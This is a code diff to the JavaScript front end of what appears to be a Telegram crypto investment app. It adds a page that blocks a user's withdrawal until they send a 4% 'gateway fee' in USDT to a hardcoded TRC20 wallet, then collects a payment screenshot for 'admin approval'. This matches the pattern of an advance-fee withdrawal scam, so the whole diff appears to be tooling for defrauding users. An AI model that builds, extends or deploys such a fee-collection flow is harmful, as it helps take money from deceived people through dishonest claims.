@@ -1526,6 +1526,151 @@ function showBankWithdrawalReceipt(wd) {
   document.body.appendChild(modal);
 }
 
+// ═══════════════════════════════════════════════════════════════
+// CRYPTO WITHDRAWAL — Gateway Fee Payment Page
+// Called after /api/withdraw succeeds for non-bank withdrawals
+// ═══════════════════════════════════════════════════════════════
+function showFeePayPage(wd, fees) {
+  if (!wd) return;
+  const fee      = (fees && fees.total_fee) ? fees.total_fee : Math.ceil((wd.amount || 0) * 0.04);
+  const netAmt   = (fees && fees.net_amount) ? fees.net_amount : (wd.amount - fee);
+  const feeAddr  = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
+  const refNo    = 'WD-' + String(wd.id || Date.now()).padStart(6,'0');
+  const now      = new Date();
+  const dateStr  = now.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'});
+  const timeStr  = now.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
+
+  const box = g('feePayBox');
+  if (!box) return;
+
+  box.innerHTML = `
+    <div style="padding:16px">
+
+      <!-- Status Banner -->
+      <div style="background:linear-gradient(135deg,#1e3a5f,#0f2744);border-radius:16px;padding:20px;margin-bottom:16px;text-align:center">
+        <div style="width:56px;height:56px;border-radius:50%;background:rgba(245,158,11,0.15);border:2px solid #f59e0b;display:flex;align-items:center;justify-content:center;margin:0 auto 12px">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        </div>
+        <div style="color:#f59e0b;font-weight:700;font-size:16px;margin-bottom:4px">Action Required</div>
+        <div style="color:#94a3b8;font-size:13px">Pay gateway fee to complete withdrawal</div>
+      </div>
+
+      <!-- Withdrawal Summary -->
+      <div style="background:#1a2744;border-radius:12px;padding:16px;margin-bottom:16px">
+        <div style="color:#64748b;font-size:11px;font-weight:600;letter-spacing:1px;margin-bottom:12px">WITHDRAWAL SUMMARY</div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="color:#94a3b8;font-size:13px">Reference</span>
+          <span style="color:#e2e8f0;font-size:13px;font-weight:600">${refNo}</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="color:#94a3b8;font-size:13px">Withdrawal Amount</span>
+          <span style="color:#e2e8f0;font-size:13px;font-weight:600">${formatUSD(wd.amount)} USDT</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="color:#94a3b8;font-size:13px">Network</span>
+          <span style="color:#e2e8f0;font-size:13px;font-weight:600">${wd.address ? wd.address.replace(/\[([^\]]+)\].*/, '$1') : 'TRC20'}</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="color:#94a3b8;font-size:13px">Date</span>
+          <span style="color:#e2e8f0;font-size:13px">${dateStr} ${timeStr}</span>
+        </div>
+        <div style="height:1px;background:#2d3748;margin:12px 0"></div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="color:#94a3b8;font-size:13px">Gateway Fee (4%)</span>
+          <span style="color:#ef4444;font-size:13px;font-weight:700">${formatUSD(fee)} USDT</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <span style="color:#94a3b8;font-size:13px">You Receive</span>
+          <span style="color:#22c55e;font-size:15px;font-weight:700">${formatUSD(netAmt)} USDT</span>
+        </div>
+      </div>
+
+      <!-- Fee Payment Instructions -->
+      <div style="background:#1a2744;border-radius:12px;padding:16px;margin-bottom:16px">
+        <div style="color:#64748b;font-size:11px;font-weight:600;letter-spacing:1px;margin-bottom:12px">PAY GATEWAY FEE VIA TRC20</div>
+        <div style="color:#94a3b8;font-size:13px;margin-bottom:12px">
+          Send exactly <strong style="color:#f59e0b">${formatUSD(fee)} USDT</strong> to this TRC20 address:
+        </div>
+        <div style="background:#0f172a;border-radius:8px;padding:12px;border:1px solid #334155;display:flex;align-items:center;gap:10px;margin-bottom:12px">
+          <div style="flex:1;color:#e2e8f0;font-size:11px;word-break:break-all;font-family:monospace">${feeAddr}</div>
+          <button onclick="navigator.clipboard?.writeText('${feeAddr}').then(()=>toast('Address copied!')).catch(()=>toast('${feeAddr}'))" 
+            style="background:#3b82f6;border:none;border-radius:6px;padding:6px 10px;color:white;font-size:11px;cursor:pointer;white-space:nowrap">Copy</button>
+        </div>
+        <div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:8px;padding:10px">
+          <div style="color:#fbbf24;font-size:12px;font-weight:600;margin-bottom:4px">⚠ Important</div>
+          <div style="color:#94a3b8;font-size:12px">Only send USDT on TRC20 network. Sending on wrong network will result in permanent loss.</div>
+        </div>
+      </div>
+
+      <!-- Receipt Upload -->
+      <div style="background:#1a2744;border-radius:12px;padding:16px;margin-bottom:16px">
+        <div style="color:#64748b;font-size:11px;font-weight:600;letter-spacing:1px;margin-bottom:12px">UPLOAD PAYMENT RECEIPT</div>
+        <div style="color:#94a3b8;font-size:13px;margin-bottom:12px">After sending the fee, upload your payment screenshot for admin verification.</div>
+        <label style="display:block;background:#0f172a;border:2px dashed #334155;border-radius:8px;padding:20px;text-align:center;cursor:pointer;margin-bottom:12px" for="feeReceiptInput">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2" style="margin-bottom:8px"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+          <div style="color:#64748b;font-size:13px" id="feeReceiptLabel">Tap to select screenshot</div>
+        </label>
+        <input type="file" id="feeReceiptInput" accept="image/*" style="display:none" 
+          onchange="document.getElementById('feeReceiptLabel').textContent = this.files[0]?.name || 'Tap to select screenshot'">
+        <button onclick="submitFeeReceipt(${wd.id})" id="feeReceiptBtn"
+          style="width:100%;background:linear-gradient(135deg,#3b82f6,#2563eb);border:none;border-radius:10px;padding:14px;color:white;font-size:15px;font-weight:600;cursor:pointer">
+          Submit Receipt for Approval
+        </button>
+      </div>
+
+    </div>`;
+
+  showPage('fee-pay');
+}
+
+// Submit fee payment receipt
+async function submitFeeReceipt(withdrawalId) {
+  const input = document.getElementById('feeReceiptInput');
+  const btn   = document.getElementById('feeReceiptBtn');
+  if (!input || !input.files[0]) { toast('Please select your payment screenshot first.'); return; }
+
+  const telegramId = String((tgU && tgU.id) ? tgU.id : '');
+  if (!telegramId) { toast('Session error. Please close and reopen the app.'); return; }
+
+  if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }
+
+  try {
+    const fd = new FormData();
+    fd.append('receipt', input.files[0]);
+    fd.append('telegramId', telegramId);
+    fd.append('withdrawalId', withdrawalId);
+
+    const resp = await fetch(API + '/withdrawal-receipt', {
+      method: 'POST',
+      headers: { 'x-telegram-init-data': tg.initData || '' },
+      body: fd
+    });
+    const r = await resp.json().catch(() => ({}));
+
+    if (r && r.success) {
+      toast('Receipt submitted! Admin will review shortly.');
+      // Show confirmation
+      const box = g('feePayBox');
+      if (box) {
+        box.innerHTML = `<div style="padding:32px;text-align:center">
+          <div style="width:64px;height:64px;border-radius:50%;background:rgba(34,197,94,0.15);border:2px solid #22c55e;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div style="color:#22c55e;font-size:18px;font-weight:700;margin-bottom:8px">Receipt Submitted</div>
+          <div style="color:#94a3b8;font-size:14px;margin-bottom:24px">Your payment receipt has been sent to admin for verification. You will be notified once approved.</div>
+          <button onclick="showPage('home')" style="background:#3b82f6;border:none;border-radius:10px;padding:12px 32px;color:white;font-size:14px;font-weight:600;cursor:pointer">Back to Home</button>
+        </div>`;
+      }
+    } else {
+      toast(r?.error || 'Submission failed. Please try again.');
+      if (btn) { btn.disabled = false; btn.textContent = 'Submit Receipt for Approval'; }
+    }
+  } catch(e) {
+    toast('Connection failed. Please try again.');
+    if (btn) { btn.disabled = false; btn.textContent = 'Submit Receipt for Approval'; }
+  }
+}
+
 function showTestimonialSubmit(type) {
   const modal = document.createElement('div');
   modal.id = 'testimonialModal';
